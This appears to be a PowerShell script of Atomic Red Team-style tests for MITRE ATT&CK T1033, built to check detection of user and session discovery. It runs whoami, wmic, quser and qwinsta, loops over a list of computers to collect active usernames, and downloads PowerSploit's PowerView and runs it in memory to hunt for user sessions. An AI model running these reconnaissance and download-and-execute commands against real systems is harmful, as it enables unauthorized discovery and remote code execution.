write-output "T1033 - System Owner/User Discovery"

write-output "Atomic Test #1 - System Owner/User Discovery"

cmd.exe /c "whoami"
cmd.exe /c "wmic useraccount get /ALL"
cmd.exe /c 'quser /SERVER:"localhost"'
cmd.exe /c "quser"
cmd.exe /c 'qwinsta.exe /server:localhost'
cmd.exe /c 'qwinsta.exe'
cmd.exe /c "for /F `"tokens=1,2`" %i in ('qwinsta /server:localhost ^| findstr `"Active Disc`"') do @echo %i | find /v `"#`" | find /v `"console`" || echo %j > usernames.txt
@FOR /F %n in (computers.txt) DO @FOR /F `"tokens=1,2`" %i in ('qwinsta /server:%n ^| findstr `"Active Disc`"') do @echo %i | find /v `"#`" | find /v `"console`" || echo %j > usernames.txt"

write-output "Atomic Test #3 - Find computers where user has session - Stealth mode (PowerView)"
IEX (IWR -UseBasicParsing 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose


